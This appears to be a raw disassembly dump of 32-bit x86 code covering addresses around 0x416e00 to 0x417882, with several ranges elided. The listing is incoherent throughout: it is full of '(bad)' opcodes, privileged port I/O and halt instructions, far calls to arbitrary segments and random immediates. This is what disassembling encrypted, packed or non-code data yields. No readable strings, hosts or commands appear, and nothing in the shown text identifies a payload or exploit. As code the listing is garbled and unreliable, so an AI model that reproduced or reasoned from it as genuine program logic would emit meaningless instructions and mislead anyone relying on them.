  416e00:	pop    ebp
  416e01:	push   0x988b63b8
  416e06:	nop
  416e07:	jbe    0x416e21
  416e09:	pop    esi
  416e0a:	imul   edx,DWORD PTR [eax],0x12
  416e0d:	mov    ecx,0xcf4fc2e4
  416e12:	xor    al,0xc3
  416e14:	test   al,0x70
  416e16:	or     DWORD PTR [edi-0x9],esp
  416e19:	push   0xffffffcd
  416e1b:	dec    ebx
  416e1c:	je     0x416df7
  416e1e:	fidiv  DWORD PTR [ebx-0x17]
  416e21:	inc    ebx
  416e22:	push   eax
  416e23:	aad    0x66
  416e25:	and    al,0x9d
  416e27:	and    BYTE PTR [ebx-0x6b53b6cb],ch
  416e2d:	and    cl,BYTE PTR [esi-0x4f]
  416e30:	mov    esp,0xb3393b74
  416e35:	push   cs
  416e36:	sar    BYTE PTR [edx],0xbf
  416e39:	pop    ecx
  416e3a:	fwait
  416e3b:	xchg   edx,eax
  416e3c:	scas   eax,DWORD PTR es:[edi]
  416e3d:	(bad)  [ebx+0x71]
  416e40:	in     eax,dx
  416e41:	push   es
  416e42:	clc    
  416e43:	mov    eax,ds:0xddd698ae
  416e48:	aam    0xd7
  416e4a:	jl     0x416eaa
  416e4c:	imul   ecx,DWORD PTR [ebx],0xffffffcf
  416e4f:	lods   al,BYTE PTR ds:[esi]
  416e50:	mov    edx,0x4ff32005
  416e55:	jnp    0x416ed2
  416e57:	scas   eax,DWORD PTR es:[edi]
  416e58:	outs   dx,BYTE PTR ds:[esi]
  416e59:	sub    esi,DWORD PTR [edi]
  416e5b:	push   eax
  416e5c:	gs repz pop es
  416e5f:	out    0xac,al
  416e61:	inc    esi
  416e62:	retf   
  416e63:	dec    ecx
  416e64:	scas   al,BYTE PTR es:[edi]
  416e65:	jae    0x416ee3
  416e67:	push   ecx
  416e68:	cmp    eax,0x4d1c9718
  416e6d:	iret   
  416e6e:	call   DWORD PTR [ebp-0x8535f9d]
  416e74:	add    WORD PTR [edx+0x27d3136],di
  416e7b:	lods   eax,DWORD PTR ds:[esi]
  416e7c:	or     DWORD PTR [edx+0xd],esp
  416e7f:	addr16 inc ebx
  416e81:	push   ss
  416e82:	dec    ebx
  416e83:	shr    BYTE PTR [ebx-0x5bc7da53],1
  416e89:	lock hlt 
  416e8b:	mov    ch,0xc5
  416e8d:	pop    eax
  416e8e:	xchg   ecx,eax
  416e8f:	add    ecx,DWORD PTR [ecx+0x0]
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x7bb28eea
  416f02:	aaa    
  416f03:	mov    ah,0x7c
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    eax,0x67000001
  416f0d:	add    bh,BYTE PTR [eax-0x17]
  416f10:	dec    edx
  416f11:	pop    eax
  416f12:	into   
  416f13:	add    ah,BYTE PTR [edi]
  416f15:	inc    eax
  416f16:	ror    BYTE PTR [ecx+0x4b],cl
  416f19:	out    dx,al
  416f1a:	push   eax
  416f1b:	mul    BYTE PTR [eax]
  416f1d:	repnz pop es
  416f1f:	mov    al,ds:0x360c303a
  416f24:	aad    0xfd
  416f26:	(bad)  [edi+0x6fcb23f9]
  416f2c:	fbld   TBYTE PTR [ecx-0x43]
  416f2f:	sub    ebx,ebp
  416f31:	loopne 0x416edc
  416f33:	enter  0x28ff,0x94
  416f37:	xchg   BYTE PTR [ebp+0x29855bf],dl
  416f3d:	cmc    
  416f3e:	push   ds
  416f3f:	xor    ah,BYTE PTR [edx+0x77]
  416f42:	cmp    dh,ch
  416f44:	cdq    
  416f45:	xchg   edx,eax
  416f46:	xlat   BYTE PTR ds:[ebx]
  416f47:	call   FWORD PTR [ebp-0x77]
  416f4a:	(bad)  
  416f4b:	mov    bh,0x97
  416f4d:	or     eax,0x612bc11c
  416f52:	leave  
  416f53:	xchg   esp,eax
  416f54:	add    DWORD PTR [eax+0x2c],edx
  416f57:	outs   dx,BYTE PTR ds:[esi]
  416f58:	dec    ebp
  416f59:	lds    edi,FWORD PTR [edi+0x21]
  416f5c:	out    0xf8,eax
  416f5e:	retf   0xb7bb
  416f61:	out    dx,al
  416f62:	js     0x416f14
  416f64:	push   edi
  416f65:	aad    0x1e
  416f67:	enter  0x2b28,0x8c
  416f6b:	xor    al,0xba
  416f6d:	and    eax,0xa68ab218
  416f72:	or     cl,cl
  416f74:	out    dx,eax
  416f75:	cmp    eax,0x9cf5cad0
  416f7a:	in     al,dx
  416f7b:	or     al,0xd0
  416f7d:	xchg   DWORD PTR [edi],ebx
  416f7f:	lock stos DWORD PTR es:[edi],eax
  416f81:	dec    ebp
  416f82:	call   0xdd64:0x9aa9ad3f
  416f89:	popf   
  416f8a:	add    ebx,esi
  416f8c:	data16 (bad) 
  416f8e:	loop   0x416f39
  416f90:	clc    
  416f91:	jle    0x416f85
  416f93:	xchg   edi,eax
  416f94:	ret    0xa83
  416f97:	(bad)
  416f9b:	sbb    DWORD PTR [edx+0x52cf66c8],ecx
  416fa1:	add    ecx,DWORD PTR [edi-0x78d10daa]
  416fa7:	add    ah,BYTE PTR [ecx-0x76268abf]
  416fad:	or     al,0x28
  416faf:	fs loope 0x416fbf
  416fb2:	(bad)
  416fb5:	lods   eax,DWORD PTR ds:[esi]
  416fb6:	push   cs
  416fb7:	adc    eax,0x88f77d48
  416fbc:	(bad)  
  416fbd:	addr16 push ebx
  416fbf:	push   es
  416fc0:	imul   ecx,DWORD PTR [edx],0x48
  416fc3:	jb     0x416f66
  416fc5:	pop    ds
  416fc6:	loope  0x417043
  416fc8:	sbb    esi,DWORD PTR ss:[ebx]
  416fcb:	out    dx,eax
  416fcc:	adc    al,0x65
  416fce:	cmp    BYTE PTR ds:0xde640d7,al
  416fd4:	sub    eax,0xb55b4c56
  416fd9:	jecxz  0x416f68
  416fdb:	push   0xe
  416fdd:	adc    DWORD PTR [edi-0x2a2bf89d],edi
  416fe3:	jecxz  0x41705d
  416fe5:	push   eax
  416fe6:	jge    0x416fa9
  416fe8:	lods   eax,DWORD PTR ds:[esi]
  416fe9:	pop    esp
  416fea:	mov    ds,WORD PTR [edx+ebx*4]
  416fed:	imul   ebp,ebx,0x9f4b5dd4
  416ff3:	bound  ebx,QWORD PTR [ebx+0x30]
  416ff6:	inc    ebp
  416ff7:	dec    esi
  416ff8:	popa   
  416ff9:	xchg   BYTE PTR [eax-0x7f],dl
  416ffc:	cmp    edi,DWORD PTR [esi-0x19acc9c1]
  417002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417003:	lahf   
  417004:	xchg   edx,eax
  417005:	sbb    esi,edx
  417007:	cmp    al,0xfd
  417009:	xor    cl,al
  41700b:	pop    esp
  41700c:	stc    
  41700d:	pop    esi
  41700e:	mov    ds:0x25b5,eax
	...
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [edx+ebx*8+0x5e]
  417083:	jg     0x417006
  417085:	repz add BYTE PTR [eax],al
  417088:	add    eax,0x1a000001
  41708d:	rcr    BYTE PTR [edx+0x13030c00],cl
  417093:	sbb    DWORD PTR [edi+ebp*4-0x57],ecx
  417097:	mov    cl,0x4c
  417099:	inc    esi
  41709a:	mov    ebp,0xc307c1d
  41709f:	push   cs
  4170a0:	pop    edx
  4170a1:	(bad)  
  4170a2:	scas   al,BYTE PTR es:[edi]
  4170a3:	or     eax,DWORD PTR [esi]
  4170a5:	icebp  
  4170a6:	and    DWORD PTR [ebx+esi*1+0x3d],esi
  4170aa:	js     0x41708c
  4170ac:	clc    
  4170ad:	adc    al,0xdb
  4170af:	(bad)  
  4170b0:	shl    BYTE PTR [ebx],1
  4170b2:	ficomp WORD PTR [edi-0x16f5a43a]
  4170b8:	pushf  
  4170b9:	das    
  4170ba:	mov    eax,0xdf6c58e5
  4170bf:	leave  
  4170c0:	in     al,0xd1
  4170c2:	dec    edi
  4170c3:	stos   BYTE PTR es:[edi],al
  4170c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170c5:	sub    esi,ecx
  4170c7:	pop    es
  4170c8:	dec    esp
  4170c9:	adc    esi,ebx
  4170cb:	jmp    0x41704d
  4170cd:	cli    
  4170ce:	lds    eax,FWORD PTR [ebx]
  4170d0:	ror    bh,cl
  4170d2:	xor    al,BYTE PTR [edi-0x4b41ab8]
  4170d8:	icebp  
  4170d9:	lds    ebx,FWORD PTR [ebx+0x75]
  4170dc:	and    ecx,edx
  4170de:	xchg   ebx,eax
  4170df:	nop
  4170e0:	inc    edi
  4170e1:	mov    ebp,0x9c19f179
  4170e6:	pop    ds
  4170e7:	or     eax,DWORD PTR ds:0x67fcd0c3
  4170ed:	inc    ebx
  4170ee:	arpl   dx,bp
  4170f0:	or     DWORD PTR [eax-0x3898c927],ecx
  4170f6:	rol    eax,0x5e
  4170f9:	clc    
  4170fa:	ins    DWORD PTR es:[edi],dx
  4170fb:	adc    ch,BYTE PTR [ebp-0x5871b1be]
  417101:	stos   BYTE PTR es:[edi],al
  417102:	mov    eax,ds:0x97b7783d
  417107:	ficomp DWORD PTR [edx-0x60]
  41710a:	cwde   
  41710b:	push   ebx
  41710c:	add    dh,BYTE PTR [ebp-0x46d38170]
  417112:	or     bl,cl
  417114:	pop    esi
  417115:	xor    DWORD PTR [ebx-0x6e],0x16
  417119:	test   ch,cl
  41711b:	out    0x82,al
  41711d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711e:	xchg   edx,eax
  41711f:	call   0xb3ba:0x99eaa5b1
  417126:	imul   ebp,DWORD PTR [edx-0x7927c36],0x97d62345
  417130:	sbb    ah,bl
  417132:	cmc    
  417133:	pop    esp
  417134:	sub    DWORD PTR [esi+0x2df8e5db],edi
  41713a:	inc    ebx
  41713b:	out    dx,al
  41713c:	out    0x8,al
  41713e:	mov    eax,es:0xee1f8656
  417144:	test   BYTE PTR [edx],dl
  417146:	mov    ds:0x64d0ec2f,eax
  41714b:	test   bl,0x87
  41714e:	xor    DWORD PTR [ecx-0x4ac32ed2],ebp
  417154:	stc    
  417155:	fdiv   DWORD PTR [esi+0xd]
  417158:	mov    WORD PTR [eax],?
  41715a:	imul   eax,DWORD PTR [ebx+0x290a87a5],0xe2d03634
  417164:	mov    al,0xd7
  417166:	pop    esi
  417167:	inc    ecx
  417168:	(bad)
  41716b:	stos   DWORD PTR es:[edi],eax
  41716c:	mov    cs,WORD PTR [edi]
  41716e:	pop    edi
  41716f:	ror    DWORD PTR gs:[ecx-0x5a],1
  417173:	mov    ah,0x5b
  417175:	stc    
  417176:	test   eax,0x60f54ee3
  41717b:	pop    es
  41717c:	push   cs
  41717d:	into   
  41717e:	inc    edx
  41717f:	xchg   esp,eax
  417180:	adc    ch,bh
  417182:	mov    al,0x83
  417184:	xchg   esp,eax
  417185:	retf   0xfea9
  417188:	adc    dl,ah
  41718a:	test   eax,0xd9434cb9
  41718f:	fcmovu st,st(2)
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	push   0x55
  417202:	and    eax,0xf486f4
  417207:	add    BYTE PTR ds:0xcb000001,al
  41720d:	out    dx,al
  41720e:	pop    eax
  41720f:	pushf  
  417210:	jle    0x41728b
  417212:	daa    
  417213:	ja     0x41720a
  417215:	iret   
  417216:	xchg   esp,eax
  417217:	mov    BYTE PTR [ecx],bl
  417219:	out    dx,al
  41721a:	adc    ebx,DWORD PTR [eax+0x1c468289]
  417220:	xor    al,0x82
  417222:	and    cl,dh
  417224:	inc    edx
  417225:	jge    0x417289
  417227:	add    BYTE PTR [edi-0x1778ef8],ah
  41722d:	add    eax,0x9bc88402
  417232:	xor    BYTE PTR [ebx],0x4d
  417235:	lods   al,BYTE PTR ds:[esi]
  417236:	lahf   
  417237:	enter  0x2ca0,0x98
  41723b:	inc    esp
  41723c:	xchg   esp,eax
  41723d:	inc    eax
  41723e:	nop
  41723f:	and    ebx,esi
  417241:	rcr    BYTE PTR [edi-0x15708ecc],0x87
  417248:	dec    esp
  417249:	mov    al,ds:0xd72d2288
  41724e:	imul   ecx,DWORD PTR [esi-0x29f46a04],0xffffffde
  417255:	hlt    
  417256:	cli    
  417257:	xchg   ebp,eax
  417258:	fwait
  417259:	sbb    al,0x37
  41725b:	or     al,0x8a
  41725d:	test   BYTE PTR [esi-0x48fce71f],0x2f
  417264:	cwde   
  417265:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417266:	sub    eax,0x648b4721
  41726b:	push   ds
  41726c:	pusha  
  41726d:	dec    edx
  41726e:	aaa    
  41726f:	dec    eax
  417270:	push   eax
  417271:	and    eax,0x1a66d839
  417276:	rcr    BYTE PTR ss:[edi],cl
  417279:	push   cs
  41727a:	push   ecx
  41727b:	hlt    
  41727c:	dec    eax
  41727d:	dec    eax
  41727e:	xor    BYTE PTR [edx-0x4a],dh
  417281:	push   esi
  417282:	inc    ebp
  417283:	jb     0x4172ea
  417285:	add    DWORD PTR [ebp+0x21],ebx
  417288:	xor    eax,0xfd64b05a
  41728d:	xor    BYTE PTR [ebp-0x165d88fe],ch
  417293:	cmp    DWORD PTR [ebp+0x61603e8d],esi
  417299:	daa    
  41729a:	loope  0x4172fb
  41729c:	cld    
  41729d:	ret    
  41729e:	mov    bh,0xe0
  4172a0:	or     al,0x83
  4172a2:	adc    edi,DWORD PTR [esp+edx*1-0x5f]
  4172a6:	fs sbb bh,al
  4172a9:	mov    ds:0xafb63678,eax
  4172ae:	test   DWORD PTR [edx-0x10],ecx
  4172b1:	jl     0x417241
  4172b3:	fwait
  4172b4:	popa   
  4172b5:	(bad)  
  4172b6:	test   BYTE PTR [edi-0x40],0x87
  4172ba:	add    BYTE PTR [ebp+0x4b283908],dl
  4172c0:	mov    ah,0x85
  4172c2:	int3   
  4172c3:	and    ecx,esi
  4172c5:	mov    ds:0x5152da9,eax
  4172ca:	icebp  
  4172cb:	dec    esi
  4172cc:	das    
  4172cd:	lods   al,BYTE PTR ds:[esi]
  4172ce:	push   0x8a8f4d4c
  4172d3:	inc    ecx
  4172d4:	mov    dh,BYTE PTR [edi-0x40]
  4172d7:	(bad)  
  4172d8:	mov    bl,0xee
  4172da:	fmul   DWORD PTR [eax-0x6e]
  4172dd:	pop    es
  4172de:	and    DWORD PTR [ebx],edx
  4172e0:	out    0xf8,al
  4172e2:	jle    0x4172be
  4172e4:	cmp    al,0xe8
  4172e6:	xor    ah,bl
  4172e8:	xor    al,BYTE PTR [edi]
  4172ea:	pop    ebx
  4172eb:	stc    
  4172ec:	scas   eax,DWORD PTR es:[edi]
  4172ed:	mov    ecx,DWORD PTR [ebx]
  4172ef:	and    cl,bh
  4172f1:	out    0x6f,al
  4172f3:	sub    al,0xf7
  4172f5:	inc    eax
  4172f6:	ds xchg edx,eax
  4172f8:	adc    eax,0x2700358
  4172fd:	sahf   
  4172fe:	aaa    
  4172ff:	mov    bh,0xef
  417301:	push   ecx
  417302:	push   ds
  417303:	inc    edi
  417304:	aam    0x61
  417306:	push   edx
  417307:	les    edx,FWORD PTR [edi+eax*4+0x10ca4155]
  41730e:	repz cmp BYTE PTR [esi],ah
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	(bad)  
  417381:	shl    BYTE PTR [eax-0x7],cl
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x65000001
  41738d:	loopne 0x41736f
  41738f:	push   ebx
  417390:	mov    al,0xd7
  417392:	jecxz  0x41735b
  417394:	outs   dx,BYTE PTR ds:[esi]
  417395:	jp     0x4173f0
  417397:	dec    ecx
  417398:	inc    ebx
  417399:	cli    
  41739a:	or     ch,dl
  41739c:	adc    bl,BYTE PTR [edi-0x69bd3e4f]
  4173a2:	push   ebp
  4173a3:	arpl   WORD PTR [eax+0x59ac8708],ax
  4173a9:	sbb    al,0x34
  4173ab:	or     DWORD PTR [edi],esi
  4173ad:	sub    al,0x1e
  4173af:	mov    al,0x34
  4173b1:	and    BYTE PTR [ebx-0x27706d34],0x67
  4173b8:	push   0x16b1e95d
  4173bd:	cmp    BYTE PTR [ebx],ch
  4173bf:	dec    eax
  4173c0:	pop    es
  4173c1:	xchg   esp,eax
  4173c2:	fstp   st(7)
  4173c4:	pushf  
  4173c5:	mov    bl,dh
  4173c7:	(bad)  ds:0x9deb3ebf
  4173cd:	jno    0x4173d2
  4173cf:	and    al,0x25
  4173d1:	iret   
  4173d2:	push   esi
  4173d3:	add    ah,bh
  4173d5:	es mov esi,0x88faba32
  4173db:	aad    0x91
  4173dd:	out    0xf2,eax
  4173df:	out    dx,al
  4173e0:	xor    edi,DWORD PTR [edi+0x12]
  4173e3:	sbb    ah,BYTE PTR [esi+0x63]
  4173e6:	mov    edi,0x63870c44
  4173eb:	xchg   esi,eax
  4173ec:	sub    dh,ah
  4173ee:	shl    BYTE PTR [edx],cl
  4173f0:	ret    
  4173f1:	adc    BYTE PTR [ecx],bh
  4173f3:	inc    edi
  4173f4:	jle    0x41745a
  4173f6:	mov    al,ds:0xbdece750
  4173fb:	mov    ch,0x7b
  4173fd:	cmp    esp,DWORD PTR [edi+0x1d09452f]
  417403:	cld    
  417404:	icebp  
  417405:	dec    ebx
  417406:	xchg   ch,dh
  417408:	pop    ecx
  417409:	int3   
  41740a:	or     BYTE PTR [eax],cl
  41740c:	adc    DWORD PTR [edx-0x3cb390dd],esi
  417412:	shl    DWORD PTR fs:[esi-0x6d6924d8],0x31
  41741a:	pop    ss
  41741b:	(bad)  
  41741d:	cmp    cl,BYTE PTR [eax+0x73]
  417420:	sbb    BYTE PTR [ebx],0x6c
  417423:	loope  0x4174a0
  417425:	fisubr WORD PTR [ebx+0x10]
  417428:	sub    bl,ah
  41742a:	(bad)  
  41742b:	bound  edi,QWORD PTR [edi+0x78ba29e2]
  417431:	jbe    0x4173d5
  417433:	jg     0x4174ad
  417435:	sahf   
  417436:	cdq    
  417437:	(bad)  
  417438:	jne    0x417449
  41743a:	repnz adc edi,DWORD PTR [ebx]
  41743d:	icebp  
  41743e:	mov    edx,0x799d58d7
  417443:	cmp    al,0x1d
  417445:	push   ecx
  417446:	jbe    0x41740c
  417448:	dec    ecx
  417449:	in     eax,dx
  41744a:	sar    DWORD PTR [eax+0x61],1
  41744d:	loopne 0x41747b
  41744f:	repnz adc DWORD PTR [edx+ecx*4+0x128731fc],eax
  417457:	out    0xf0,al
  417459:	push   eax
  41745a:	and    BYTE PTR [esi-0x539ec24e],ch
  417460:	lock mov al,0xfd
  417463:	or     dl,BYTE PTR [edi+0x4e]
  417466:	inc    eax
  417467:	add    BYTE PTR [bx-0x52],dh
  41746b:	pop    edx
  41746c:	shl    BYTE PTR [ebp-0x73],0x17
  417470:	xchg   ecx,eax
  417471:	lock mov bh,dh
  417474:	std    
  417475:	push   edx
  417476:	inc    ebx
  417477:	mov    ds:0xe615c468,eax
  41747c:	ret    
  41747d:	adc    ebx,DWORD PTR [esi+0x20b4caff]
  417483:	aaa    
  417484:	sub    eax,0x3a8111f3
  417489:	rol    BYTE PTR [edi+edx*2-0x7a551ba9],cl
  417490:	cmp    DWORD PTR [eax],eax
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	scas   eax,DWORD PTR es:[edi]
  417501:	int3   
  417502:	pop    ss
  417503:	push   ebp
  417504:	nop
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0xd5000001
  41750d:	pop    ecx
  41750e:	mov    esp,0x77cb1631
  417513:	mov    ebp,0x642e8837
  417518:	sub    al,0x33
  41751a:	cmp    DWORD PTR [ebx+0x73],ebp
  41751d:	pop    edx
  41751e:	mov    esi,0x2772cfd7
  417523:	adc    BYTE PTR gs:[ebx+ebx*8+0x24],dl
  417528:	sub    eax,0x942456c6
  41752d:	lea    eax,[bp+di]
  417530:	xchg   ecx,eax
  417531:	xor    esp,DWORD PTR [edx-0x30]
  417534:	push   esp
  417535:	dec    ebx
  417536:	push   ds
  417537:	mov    ah,BYTE PTR [ebp+edx*8+0x52]
  41753b:	jp     0x417589
  41753d:	mov    edi,0x7df6f079
  417542:	popf   
  417543:	or     bl,BYTE PTR [edx]
  417545:	sub    BYTE PTR [ebx],ah
  417547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417548:	aam    0xe7
  41754a:	or     ecx,ebx
  41754c:	inc    edi
  41754d:	push   esp
  41754e:	cli    
  41754f:	cmp    ecx,DWORD PTR [eax+0x25f6812b]
  417555:	jmp    0x41755e
  417557:	call   DWORD PTR [ecx-0x3e]
  41755a:	fmul   DWORD PTR [ebx+0x177ec244]
  417560:	not    bh
  417562:	mov    esi,0xabbb9e3b
  417567:	cmp    bh,al
  417569:	cli    
  41756a:	mov    ebp,0x48c46a33
  41756f:	aad    0x79
  417571:	sub    DWORD PTR [ebp+0x79a55e08],eax
  417577:	aam    0x53
  417579:	out    0x96,al
  41757b:	add    BYTE PTR [edx+0x3f],0x7f
  41757f:	push   ss
  417580:	sbb    eax,0x9ece1e65
  417585:	pushf  
  417586:	imul   ecx,esi,0x7a
  417589:	gs or  al,0x2c
  41758c:	push   cs
  41758d:	fwait
  41758e:	cmp    DWORD PTR [eax+ecx*1+0xb623c72],0xe9076acc
  417599:	cdq    
  41759a:	adc    DWORD PTR [eax+0x71],esi
  41759d:	retf   
  41759e:	repnz pop eax
  4175a0:	dec    edi
  4175a1:	test   dl,cl
  4175a3:	fnsave [ebx]
  4175a5:	ss sub ebp,ecx
  4175a8:	lea    esi,[edx-0x6c8da871]
  4175ae:	lds    edi,FWORD PTR [esi-0x567f08b7]
  4175b4:	mov    dh,0x43
  4175b6:	mov    eax,ds:0x8c99d77b
  4175bb:	add    BYTE PTR [ebp+eax*8+0x18],0x12
  4175c0:	mov    ?,ebp
  4175c2:	add    al,0x46
  4175c4:	icebp  
  4175c5:	rcl    DWORD PTR [edx+0x73e9b478],cl
  4175cb:	inc    esp
  4175cc:	lea    edx,[ebp-0xd]
  4175cf:	retf   0xc36b
  4175d2:	clc    
  4175d3:	aaa    
  4175d4:	in     eax,dx
  4175d5:	mov    esi,0xb477cea4
  4175da:	test   DWORD PTR [edi-0x57aeb8a9],esi
  4175e0:	dec    ebp
  4175e1:	int3   
  4175e2:	mov    ds:0x845c53c7,al
  4175e7:	arpl   ax,bp
  4175e9:	std    
  4175ea:	sbb    DWORD PTR [edx-0xb394a4b],esp
  4175f0:	add    al,0xcd
  4175f2:	cld    
  4175f3:	or     BYTE PTR [ebp+0x60aa2cdf],bh
  4175f9:	mov    eax,0xf99404c8
  4175fe:	add    dh,cl
  417600:	jecxz  0x41765c
  417602:	xchg   DWORD PTR [ebx],edx
  417604:	lods   eax,DWORD PTR ds:[esi]
  417605:	xor    al,0xcf
  417607:	jo     0x4175e6
  417609:	mov    ecx,0xc8469086
  41760e:	scas   al,BYTE PTR es:[edi]
  41760f:	mov    edi,0x2d
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fcmove st,st(6)
  417681:	push   esp
  417682:	jg     0x417672
  417684:	xchg   ebp,eax
  417685:	test   DWORD PTR [eax],0x10500
  41768b:	add    dl,ah
  41768d:	(bad)  
  41768e:	mov    edi,0xc5742e26
  417693:	dec    esi
  417694:	into   
  417695:	(bad)  
  417697:	daa    
  417698:	retf   
  417699:	loopne 0x4176c6
  41769b:	popa   
  41769c:	and    eax,DWORD PTR [ebp+edx*1-0x48]
  4176a0:	test   BYTE PTR [esi+0x532ab7f2],dh
  4176a6:	rcr    BYTE PTR ds:0xdfd34551,cl
  4176ac:	retf   
  4176ad:	rol    BYTE PTR [esi+0x2f],cl
  4176b0:	es loope 0x4176dc
  4176b3:	and    esi,ebx
  4176b5:	sub    eax,0x9c48f9d4
  4176ba:	add    DWORD PTR [esi+0x31ebe440],edx
  4176c0:	mov    DWORD PTR [edx+0x6d],edi
  4176c3:	(bad)  
  4176c5:	lea    eax,[esi+edi*8]
  4176c8:	jbe    0x4176a3
  4176ca:	sub    BYTE PTR [ecx+eiz*1-0x75],dl
  4176ce:	pop    ds
  4176cf:	(bad)
  4176d2:	jb     0x417739
  4176d4:	xchg   ecx,eax
  4176d5:	ffree  st(4)
  4176d7:	mov    ecx,0x3fcc7f30
  4176dc:	jmp    0xeee17dea
  4176e1:	arpl   WORD PTR [edi-0x287163d],si
  4176e7:	pop    esp
  4176e8:	idiv   BYTE PTR [edx]
  4176ea:	adc    BYTE PTR [eax],ah
  4176ec:	ins    DWORD PTR es:[edi],dx
  4176ed:	lahf   
  4176ee:	add    eax,0x47149460
  4176f3:	mov    BYTE PTR [ebx+0x53],0x55
  4176f7:	or     DWORD PTR [ecx-0x39],esi
  4176fa:	mov    ebx,0xf67073d0
  4176ff:	mov    al,0x77
  417701:	aad    0x90
  417703:	(bad)  
  417704:	adc    eax,0x799dde84
  417709:	add    ah,BYTE PTR [edi]
  41770b:	lods   eax,DWORD PTR ds:[esi]
  41770c:	push   esi
  41770d:	and    ch,BYTE PTR [edx-0xeffef1c]
  417713:	mov    edi,0xcf1e9e61
  417718:	(bad)  
  417719:	scas   eax,DWORD PTR es:[edi]
  41771a:	ret    0xd5c3
  41771d:	xchg   ebp,eax
  41771e:	adc    bh,ch
  417720:	cmc    
  417721:	pop    ds
  417722:	pusha  
  417723:	push   eax
  417724:	pop    esi
  417725:	aas    
  417726:	fcom   DWORD PTR [edx+0x30]
  417729:	fst    DWORD PTR [esi+0x44]
  41772c:	mov    dh,BYTE PTR [esi+0x78]
  41772f:	bnd jne 0x417791
  417732:	dec    ecx
  417733:	idiv   BYTE PTR [esi-0x7f]
  417736:	cmp    al,0x92
  417738:	sub    BYTE PTR [edi+0x26985bcb],bl
  41773e:	xor    DWORD PTR [esi-0x3b],0x5d
  417742:	popa   
  417743:	add    DWORD PTR [ebx-0x61227471],ebx
  417749:	fwait
  41774a:	and    BYTE PTR [eax-0x71],bl
  41774d:	pop    eax
  41774e:	xor    al,0xc4
  417750:	inc    esi
  417751:	in     al,0xe3
  417753:	retf   
  417754:	xor    eax,0x5c91feea
  417759:	add    eax,0xadeb60d7
  41775e:	loop   0x417719
  417760:	mov    edx,0xbb5b2946
  417765:	mov    dh,0x80
  417767:	dec    esi
  417768:	outs   dx,BYTE PTR ds:[esi]
  417769:	fldenv es:[edi-0xab13c77]
  417770:	(bad)  
  417771:	imul   DWORD PTR [ebp-0x12]
  417774:	stc    
  417775:	lock push esp
  417777:	xor    ebp,esi
  417779:	or     edx,DWORD PTR [ecx+0xce1ffec]
  41777f:	inc    esi
  417780:	loopne 0x417728
  417782:	bound  edx,QWORD PTR [edi+0x76c043b2]
  417788:	out    0x5d,eax
  41778a:	mov    bl,BYTE PTR [edi+ebx*4+0x2e88f3d7]
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [ebx],cl
  417801:	xchg   DWORD PTR [ecx+0xf89a3f],esi
  417807:	add    BYTE PTR ds:0xb2000001,al
  41780d:	inc    edi
  41780e:	hlt    
  41780f:	or     eax,0x40551130
  417814:	xchg   ebx,eax
  417815:	mov    bl,0x11
  417817:	out    0x30,eax
  417819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41781a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41781b:	adc    al,0xd8
  41781d:	iret   
  41781e:	cwde   
  41781f:	mov    BYTE PTR [esi],dl
  417821:	add    ah,BYTE PTR [ecx+0x407e06c9]
  417827:	cwde   
  417828:	hlt    
  417829:	test   DWORD PTR [edx+0x2fc70a92],esi
  41782f:	jmp    0x5ebb3bae
  417834:	sub    DWORD PTR [ecx+0x6f86b7d3],0x82c37ec
  41783e:	mov    dl,0x3d
  417840:	cmp    ebx,DWORD PTR [ecx+0x62]
  417843:	xchg   edx,eax
  417844:	fnstcw WORD PTR [edx-0x1c]
  417847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417848:	loopne 0x417872
  41784a:	outs   dx,BYTE PTR ds:[esi]
  41784b:	or     BYTE PTR [edi+0x3e],al
  41784e:	xor    esi,DWORD PTR [edx]
  417850:	out    0x67,eax
  417852:	jae    0x41789f
  417854:	jo     0x4178cf
  417856:	int3   
  417857:	add    al,0xf9
  417859:	cmc    
  41785a:	cmp    eax,0x21e2b6ec
  41785f:	(bad)  [edx]
  417861:	or     eax,0x5dea9f95
  417866:	aad    0x4f
  417868:	jne    0x417892
  41786a:	in     eax,dx
  41786b:	mov    dl,0x3b
  41786d:	in     al,0x54
  41786f:	pushf  
  417870:	imul   eax,DWORD PTR [edi],0xffffffe5
  417873:	aad    0xbf
  417875:	jp     0x4178c7
  417877:	xchg   dl,ch
  417879:	lds    ebx,FWORD PTR [ebp+0x56]
  41787c:	dec    ebx
  41787d:	ins    DWORD PTR es:[edi],dx
  41787e:	inc    ebx
  41787f:	and    al,0x6f
  417881:	stc    
  417882:	or     ecx,ecx
